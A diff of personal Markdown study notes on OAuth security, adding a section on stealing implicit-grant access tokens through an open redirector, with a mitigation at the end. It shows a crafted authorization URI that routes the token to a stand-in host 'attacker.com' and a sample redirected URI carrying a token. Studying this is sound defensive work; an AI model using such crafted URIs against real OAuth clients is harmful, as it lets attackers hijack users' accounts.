@@ -1444,8 +1444,8 @@ But in the background, **the victim's browser will load the embedded img tag for
 
 > **Where is my Referrer?**
 >
-> The URI in the attacker’s post must be an https URI.
-> Indeed, as per section 15.1.3 (Encoding Sensitive Information in URI’s) of HTTP RFC [RFC 2616]:
+> The URI in the attacker's post must be an https URI.
+> Indeed, as per section 15.1.3 (Encoding Sensitive Information in URI's) of HTTP RFC [RFC 2616]:
 >
 > > Clients SHOULD NOT include a Referer header field in a (non-secure) HTTP request if the referring page was transferred with a secure protocol.
 
@@ -1453,7 +1453,59 @@ But in the background, **the victim's browser will load the embedded img tag for
 
 #### 7.4.2 Stealing the token through an open redirector
 
-_( icehe : 详见原文, 还不够理解. Note it later. )_
+……, but **this one is based on the implicit grant type**.
+This attack also **targets the access token** rather than the authorization code.
+
+To understand this attack, you need to understand **how the URI fragment (the part after the `#`) is handled by browsers on HTTP redirect responses (HTTP 301/302 responses).**
+Although you might know that fragment is the optional last part of a URI for a document, it isn't intuitive what happens to the fragment upon redirect.
+
+To offer a concrete example:
+**if an HTTP request `/bar#foo` has a 302 response with Location `/qux`, is the `#foo` part appended to the new URI (namely, the new request is `/qux#foo`) or not (namely, the new request is `/qux`)?**
+
+**What the majority of browsers do at the moment is to preserve the original fragment on redirect**: that is, the new request is on the form `/qux#foo`.
+Also remember that **fragments are never sent to the server, as they're intended to be used inside the browser itself**.
+Having this in mind, the following attack is based on another common web vulnerability called <u>**open redirect**</u><!-- 开放重定向 -->.
+
+_This is also listed by the OWASP Top 10 that defines it as_
+
+> **an application that takes a parameter and redirects a user to the parameter value without any validation**.
+> This vulnerability is used in phishing attacks<!-- 钓鱼攻击 --> to get users to visit malicious sites without realizing it.
+
+_There is still some debate about this class of vulnerability because often they're relatively benign<!-- 良性的 -->, but not always, as we can see later in this and subsequent chapters._
+
+The attack here is similar to the previous one and all the premises we have established there remain: "too open" registered `redirect_uri` and authorization server that uses an allowing subdirectory validation strategy.
+
+_As the leakage here happens through an open redirect rather than using the referrer, you also need to assume that the OAuth client's domain has an open redirect, for example:_
+`https://yourouauthclient.com/redirector?goto=http://targetwebsite.com`.
+_As previously mentioned, there are fair chances that this kind of entry point exists on a website (even in the OAuth context). ……_
+
+……
+
+The attacker can craft a URI like this:
+
+```http
+https://oauthprovider.com/authorize?response_type=token&client_id=CLIENT_ID&scope=SCOPES&state=STATE&redirect_uri=https://yourouauthclient.com/redirector?goto=https://attacker.com
+```
+
+If the resource owner has already authorized the application using TOFU, or if they can be convinced to authorize the application again, the resource owner's user agent is redirected to the passed-in `redirect_uri` with the `access_token` appended in the URI fragment:
+
+```http
+https://yourouauthclient.com/redirector?goto=https://attacker.com#access_ token=2YotnFZFEjr1zCsicMWpAA
+```
+
+<!-- icehe : 这一段比较费解, 浏览器会将 query string 里的 access_token 参数拼接到 `#` 后面, 而不是拼接到 `?` 后面吗? -->
+
+Now it's trivial for the attacker to steal the access token.
+Indeed, it's enough to read the delivered `location.hash` using JavaScript code.
+
+![hijacking-of-access-token-through-uri-fragment.png](_image/hijacking-of-access-token-through-uri-fragment.png)
+
+Both the attacks discussed above can be mitigated by the same simple practice.
+By registering the most specific `redirect_uri` possible, that would correspond to
+`https://yourouauthclient.com/oauth/oauthprovider/callback` in our example, the client can avoid having the attacker take over control of its OAuth domain.
+Obviously, you need to design your client application to avoid letting an attacker create a page under
+`https://yourouauthclient.com/oauth/oauthprovider/callback` as well; otherwise, you're back to square one.
+However, the more specific and direct the registration is, the less likely it is for there to be a matching URI under the control of a malicious party.
 
 ### 7.5 Theft of authorization codes
 
